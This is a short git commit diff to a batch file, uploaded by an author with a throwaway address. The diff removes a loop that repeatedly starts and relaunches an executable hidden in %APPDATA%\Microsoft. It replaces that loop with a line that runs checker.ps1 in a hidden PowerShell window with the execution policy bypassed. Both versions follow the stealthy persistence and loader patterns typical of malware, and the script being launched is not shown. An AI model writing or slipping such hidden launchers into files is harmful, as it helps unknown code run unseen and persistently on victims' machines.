5a7c2109a359de14e84f17b350ded990c7f31c99
AnnaliseHackett <fdsjkrnennnnnnnnnnnnnnnnugierhguierhngiengioejgfmeofe@tempmail.ckvn.edu.vn>
2026-02-23 13:11:54 +0700

    Add files via upload

--- bat.bat
+++ bat.bat
@@ -1,24 +1,2 @@
 @echo off
-setlocal enabledelayedexpansion
-
-:loop
-set "warp_path=%APPDATA%\Microsoft\warp.exe"
-
-if exist "%warp_path%" (
-    echo Đã tìm thấy warp.exe tại: %warp_path%
-) else (
-    timeout /t 5
-    goto loop
-)
-start "" /b "%warp_path%"
-timeout /t 5 >nul
-
-:waitloop
-tasklist /FI "IMAGENAME eq warp.exe" 2>NUL | find /I "warp.exe" >NUL
-if errorlevel 1 (
-    goto loop
-) else (
-    timeout /t 3 >nul
-    goto waitloop
-
-)
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "checker.ps1"
